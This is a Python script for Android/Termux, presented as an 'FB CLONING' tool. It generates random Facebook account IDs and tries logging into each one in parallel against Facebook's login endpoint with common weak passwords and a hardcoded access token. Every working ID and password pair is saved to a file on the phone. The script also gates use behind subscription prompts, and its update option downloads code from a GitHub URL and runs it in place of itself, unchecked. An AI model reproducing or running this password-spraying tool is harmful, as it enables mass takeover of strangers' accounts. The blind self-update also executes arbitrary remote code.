# -*- coding: utf-8 -*-
# Coded By Raja Vau & Kamrul
import os
import sys
import time
import random
import uuid
import requests
from concurrent.futures import ThreadPoolExecutor as tred

YT_LINK = "https://youtube.com/@raja-vau-teach-world?si=26nJB-oc4RQb3DCo"
WA_LINK = "https://chat.whatsapp.com/K9E5ULcGZ7G0O15wwvodfy?s=sh&p=a&mlu=4&ilr=4"
UNLOCK_FILE = os.path.expanduser("~/.raja_unlocked.txt")
UPDATE_URL = "https://raw.githubusercontent.com/nasirkamaluk27-hue/Old/main/rajavau.py"

def subscription_gate():
    if os.path.exists(UNLOCK_FILE):
        return
    os.system('clear')
    print("\033[1;31m╔═════════════════════════════════════════════╗\033[0m")
    print("\033[1;31m║               [!] ACCESS DENIED             ║\033[0m")
    print("\033[1;31m║    You must Subscribe to our YouTube &      ║\033[0m")
    print("\033[1;31m║     Join WhatsApp Group to Unlock Tool!     ║\033[0m")
    print("\033[1;31m╚═════════════════════════════════════════════╝\033[0m")
    
    input("\033[1;33m[?] Press Enter to Open YouTube Channel & Subscribe...\033[0m")
    os.system(f"am start -a android.intent.action.VIEW -d '{YT_LINK}' >/dev/null 2>&1 || termux-open-url '{YT_LINK}'")
    time.sleep(3)

    input("\n\033[1;33m[?] Press Enter to Join WhatsApp Group...\033[0m")
    os.system(f"am start -a android.intent.action.VIEW -d '{WA_LINK}' >/dev/null 2>&1 || termux-open-url '{WA_LINK}'")
    time.sleep(3)

    verify = input("\n\033[1;32m[?] Have you Subscribed to YouTube and Joined WhatsApp? (y/n): \033[0m").strip().lower()
    if verify == 'y':
        print("\n\033[1;32mwelcome to Raja Vau Teach World\033[0m")
        print("\033[1;32myour Kes approved\033[0m")
        with open(UNLOCK_FILE, "w") as f:
            f.write("approved")
        time.sleep(2)
    else:
        print("\n\033[1;31m[×] Access Denied! You must subscribe to use this tool.\033[0m")
        time.sleep(2)
        sys.exit()

if __name__ == "__main__":
    subscription_gate()

oks = []
loop = 0

def window1():
    return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"

def creationyear(uid):
    if len(uid) == 15:
        if uid.startswith('10000'): return '2016'
        if uid.startswith('10001'): return '2016'
        return '2020'
    return '2012'

def banner():
    os.system('clear')
    print("""\033[1;32m
╔═════════════════════════════════════════════════╗
║ ██╗  ██╗  █████╗  ███╗   ███╗  █████╗  ██╗      ║
║ ██║ /██/  ██╔══██╗ ████╗ ████║ ██╔══██╗ ██║      ║
║ █████/    ███████║ ██╔████╔██║ ███████║ ██║      ║
║ ██╔-██╗   ██╔══██║ ██║ ╚═╝ ██║ ██╔══██║ ██║      ║
║ ██║  ██╗  ██║  ██║ ██║     ██║ ██║  ██║ ███████║ ║
║ ╚═╝  ╚═╝  ╚═╝  ╚═╝ ╚═╝     ╚═╝ ╚═╝  ╚═╝ ╚══════╝ ║
║                     KAMAL                       ║
╚═════════════════════════════════════════════════╝\033[1;97m""")
    print("=" * 45)
    print(f"[+] Owner  : Raja Vau")
    print(f"[+] TOOL   : FB CLONING SYSTEM")
    print("=" * 45)

def update_script():
    print("\033[1;36m")
    print("╔" + "═" * 58 + "╗")
    print("║" + " " * 20 + "SYSTEM UPDATE" + " " * 25 + "║")
    print("╠" + "═" * 58 + "╣")
    print("║   Checking latest version..." + " " * 28 + "║")
    print("╚" + "═" * 58 + "╝")
    print("\033[0m")

    script_path = os.path.abspath(__file__)
    temp_path = script_path + ".new"

    try:
        print("\033[1;36m[•] Downloading update...\033[0m")
        response = requests.get(UPDATE_URL, timeout=15)
        response.raise_for_status()
        new_code = response.content

        if len(new_code) < 100:
            print("\033[1;31m[!] Update file is invalid.\033[0m")
            return

        with open(temp_path, "wb") as f:
            f.write(new_code)

        print("\033[1;32m[+] Update downloaded.\033[0m")
        print("\033[1;36m[•] Installing update...\033[0m")
        os.replace(temp_path, script_path)
        print("\033[1;32m[+] Update installed successfully.\033[0m")
        print("\033[1;36m[•] Restarting...\033[0m")
        time.sleep(1)
        os.execv(sys.executable, [sys.executable] + sys.argv)

    except requests.RequestException as e:
        if os.path.exists(temp_path):
            os.remove(temp_path)
        print(f"\033[1;31m[!] Download failed: {e}\033[0m")
    except Exception as e:
        if os.path.exists(temp_path):
            os.remove(temp_path)
        print(f"\033[1;31m[!] Update failed: {e}\033[0m")

def main_menu():
    while True:
        banner()
        print("\033[1;36m╔" + "═" * 58 + "╗\033[0m")
        print("\033[1;36m║\033[1;37m" + " " * 21 + "MAIN MENU" + " " * 28 + "\033[1;36m║\033[0m")
        print("\033[1;36m╠" + "═" * 58 + "╣\033[0m")
        print("\033[1;36m║   \033[1;37m[1]\033[0m \033[1;32mFB CLONING \033[0m" + " " * 38 + "\033[1;36m║\033[0m")
        print("\033[1;36m║   \033[1;37m[2]\033[0m \033[1;36mUPDATE\033[0m" + " " * 43 + "\033[1;36m║\033[0m")
        print("\033[1;36m║   \033[1;37m[3]\033[0m \033[1;31mEXIT\033[0m" + " " * 45 + "\033[1;36m║\033[0m")
        print("\033[1;36m╠" + "═" * 58 + "╣\033[0m")
        print("\033[1;36m║\033[1;37m  Select an option to continue." + " " * 26 + "\033[1;36m║\033[0m")
        print("\033[1;36m╚" + "═" * 58 + "╝\033[0m")

        ch = input("\033[1;37m\nCHOOSE [1/2/3]: \033[0m").strip()
        if ch == '1':
            old_clone()
        elif ch == '2':
            update_script()
        elif ch == '3':
            print("\033[1;31m\n[!] Exiting...\033[0m")
            sys.exit(0)
        else:
            print("\033[1;31m[!] Invalid option.\033[0m")
            time.sleep(1)

def old_clone():
    banner()
    print('[A] ALL SERIES')
    print('[B] 100003/4 SERIES')
    print('[C] 2009 SERIES')
    print("=" * 45)
    _input = input("CHOICE : ").strip().upper()
    if _input == 'A':
        old_One()
    elif _input == 'B':
        old_Tow()
    elif _input == 'C':
        old_Tree()
    else:
        main_menu()

def old_One():
    user = []
    banner()
    limit = input("TOTAL ID LIMIT (e.g. 20000): ")
    print("=" * 45)
    star = '10000'
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 4999999999)))
        user.append(star + data)
    run_cracking(user)

def old_Tow():
    user = []
    banner()
    limit = input("TOTAL ID LIMIT (e.g. 20000): ")
    print("=" * 45)
    prefixes = ['100003', '100004']
    for _ in range(int(limit)):
        uid = random.choice(prefixes) + ''.join(random.choices('0123456789', k=9))
        user.append(uid)
    run_cracking(user)

def old_Tree():
    user = []
    banner()
    limit = input("TOTAL ID LIMIT (e.g. 20000): ")
    print("=" * 45)
    prefix = '1000004'
    for _ in range(int(limit)):
        uid = prefix + ''.join(random.choices('0123456789', k=8))
        user.append(uid)
    run_cracking(user)

def run_cracking(user):
    banner()
    print(f"TOTAL IDS : {len(user)}")
    print("=" * 45)
    with tred(max_workers=30) as pool:
        for uid in user:
            pool.submit(login_1, uid)

def login_1(uid):
    global loop
    session = requests.session()
    try:
        sys.stdout.write(f"\r\r[RAJA-CLONE] [Loop: {loop}] [OK: {len(oks)}]")
        sys.stdout.flush()
        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'locale': 'en_US',
                'method': 'auth.login'
            }
            headers = {'User-Agent': window1()}
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in res:
                print(f"\n\033[1;32m[RAJA-OK] {uid} | {pw}\033[0m")
                open('/sdcard/RAJA-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
        loop += 1
    except Exception:
        pass

if __name__ == '__main__':
    main_menu()
